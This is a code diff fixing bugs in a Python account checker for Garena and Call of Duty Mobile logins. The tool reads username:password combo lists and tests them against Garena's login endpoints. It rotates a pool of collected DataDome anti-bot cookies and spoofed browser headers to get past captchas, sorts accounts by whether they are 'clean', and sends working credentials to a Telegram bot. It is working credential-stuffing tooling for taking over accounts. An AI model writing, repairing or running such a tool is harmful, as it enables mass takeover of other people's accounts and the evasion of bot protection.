@@ -223,7 +223,8 @@ def save_datadome_cookie(cookie_value):
     if not cookie_value: return
     file_path = os.path.join(get_app_data_directory(), "datadome_cookies.json")
     cookie_pool = load_data(file_path) if isinstance(load_data(file_path), list) else []
-    if not any(c.get('datadome') == cookie_value for c in cookie_pool):
+    # FIXED: Corrected the check to ensure it handles dictionaries properly
+    if not any(isinstance(c, dict) and c.get('datadome') == cookie_value for c in cookie_pool):
         cookie_pool.append({'datadome': cookie_value})
         save_data(file_path, cookie_pool)
         log_message("[💾] New DataDome Cookie saved to pool.", "text-info")
@@ -287,7 +288,10 @@ def check_login(account_username, _id, encryptedpassword, password, selected_hea
 def show_level(access_token, selected_header, sso, token, newdate, cookie):
     params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
     headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
-    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
+    if cookie:
+        cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
+    else:
+        cookie = {"datadome": newdate, "sso_key": sso, "token_session": token}
     try:
         res = requests.get("https://auth.codm.garena.com/auth/auth/callback_n", headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
         res.raise_for_status()
@@ -348,32 +352,25 @@ def format_result(bindings, is_clean, date, username, password, codm_level, conn
     content_to_write = console_message + "\n" + "=" * 60 + "\n"
     return (console_message, telegram_message, codm_level_num, bindings.get("Country", "N/A"), username, password, bindings.get("Garena Shells", "0"), has_codm, is_clean, file_to_write, content_to_write)
 
-# --- THIS IS THE FIXED FUNCTION ---
 def get_request_data(selected_cookie_module):
     cookies = selected_cookie_module.get_cookies()
-    # These are the correct, detailed headers copied from your original working file.
     headers = {
-        'Host': 'auth.garena.com',
-        'Connection': 'keep-alive',
+        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
         'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
         'sec-ch-ua-mobile': '?1',
         'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
-        'sec-ch-ua-platform': '"Android"',
-        'Sec-Fetch-Site': 'same-origin',
-        'Sec-Fetch-Mode': 'cors',
+        'sec-ch-ua-platform': '"Android"', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Dest': 'empty',
         'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
-        'Accept-Encoding': 'gzip, deflate, br, zstd',
-        'Accept-Language': 'en-US,en;q=0.9'
+        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
     }
     return cookies, headers
-# --- END OF THE FIX ---
 
 def check_account(username, password, date, datadome_cookie, selected_cookie_module):
     for attempt in range(3):
         try:
             random_id = "17290585" + str(random.randint(10000, 99999))
-            cookies, headers = get_request_data(selected_cookie_module) # This will now get the correct headers
+            cookies, headers = get_request_data(selected_cookie_module)
             if datadome_cookie: cookies['datadome'] = datadome_cookie
             response = requests.get("https://auth.garena.com/api/prelogin", params={"account": username, "format": "json", "id": random_id}, cookies=cookies, headers=headers, timeout=20)
             if "captcha" in response.text.lower(): return "[CAPTCHA]"
@@ -396,20 +393,18 @@ def send_to_telegram(bot_token, chat_id, message):
     except Exception: return False
 
 def remove_duplicates_from_file(file_path):
+    # FIXED: Function signature and logic simplified to prevent errors
     try:
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
-        initial_count = len(lines)
         unique_lines = list(OrderedDict.fromkeys(line for line in lines if line.strip()))
-        removed_count = initial_count - len(unique_lines)
+        removed_count = len(lines) - len(unique_lines)
         if removed_count > 0:
             with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
             log_message(f"[✨] Removed {removed_count} duplicate/empty line(s).", "text-info")
-        return unique_lines, len(unique_lines)
-    except FileNotFoundError: return [], 0
-    except Exception:
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = [line for line in f.read().splitlines() if line.strip()]
-        return lines, len(lines)
+        return unique_lines
+    except FileNotFoundError:
+        log_message(f"Error: File not found at '{file_path}'.", "text-danger")
+        return []
 
 def clear_progress():
     if os.path.exists(PROGRESS_STATE_FILE): os.remove(PROGRESS_STATE_FILE)
@@ -431,7 +426,8 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             set_cookie.set_fixed_number(fixed_cookie_number)
         stats = { 'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0 }
         date = str(int(time.time()))
-        accounts, total_accounts = remove_duplicates_from_file(file_path)
+        accounts = remove_duplicates_from_file(file_path)
+        total_accounts = len(accounts)
 
         accounts_to_process = accounts if is_premium else accounts[:FREE_TIER_LIMIT]
         if not is_premium and len(accounts) > FREE_TIER_LIMIT:
@@ -456,6 +452,10 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                 username, password = acc.split(':', 1)
                 is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
+                    if not cookie_pool:
+                        log_message("[❌] Cookie pool is empty. Cannot continue.", "text-danger")
+                        stop_event.set()
+                        break
                     cookie_index = (cookie_index + 1) % len(cookie_pool)
                     current_datadome = cookie_pool[cookie_index]
                     log_message(f"[▶] Checking: {username} with cookie ...{current_datadome[-6:]}", "text-info")
